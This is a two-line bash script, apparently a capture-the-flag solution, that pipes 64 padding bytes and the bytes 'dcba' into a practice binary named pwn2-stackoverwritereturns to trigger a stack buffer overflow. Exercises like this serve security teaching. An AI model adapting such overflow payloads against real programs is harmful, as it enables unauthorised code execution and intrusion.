#!/bin/bash

python -c "print('a'*64+'\x64\x63\x62\x61')" | ./pwn2-stackoverwritereturns
